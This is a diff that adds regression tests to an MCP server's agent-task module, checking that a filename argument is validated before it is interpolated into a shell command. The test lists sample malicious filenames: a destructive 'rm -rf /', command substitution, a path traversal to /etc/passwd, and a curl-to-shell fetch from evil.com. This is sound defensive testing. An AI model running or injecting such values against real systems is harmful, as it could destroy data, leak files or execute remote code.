@@ -13,6 +13,7 @@ from examples.mcp_server.agent_tasks import (
     build_task_json,
     list_agent_tasks,
     read_agent_task_file,
+    validate_filename,
     validate_task_id,
 )
 
@@ -118,6 +119,38 @@ class TestReadAgentTaskFile:
         assert len(calls) == 1
         assert calls[0][0] == "my-proj"
         assert "a12345678901/agent-status.md" in calls[0][1]
+
+    def test_rejects_shell_injection_in_filename(self):
+        """Regression: filename was interpolated raw into a shell command
+        with zero escaping or validation. Every current caller passes a
+        hardcoded literal, but the function itself was a command-injection
+        and path-traversal landmine for any future caller that doesn't.
+        """
+        calls = []
+
+        def fake_run_cmd(project: str, command: str) -> dict:
+            calls.append((project, command))
+            return {"stdout": "should never run", "stderr": "", "exit_code": 0}
+
+        for malicious in [
+            "x; rm -rf /",
+            "x$(whoami)",
+            "x`whoami`",
+            "../../../etc/passwd",
+            "x && curl evil.com | sh",
+        ]:
+            with pytest.raises(ValueError):
+                read_agent_task_file(
+                    fake_run_cmd,
+                    project="my-proj",
+                    task_id="a12345678901",
+                    filename=malicious,
+                )
+        assert calls == [], "run_cmd must never be invoked with an unvalidated filename"
+
+    def test_accepts_safe_filenames(self):
+        for name in ["agent-status.md", "agent-report.md", "implementation-diff.patch"]:
+            validate_filename(name)
 
 
 class TestListAgentTasks:
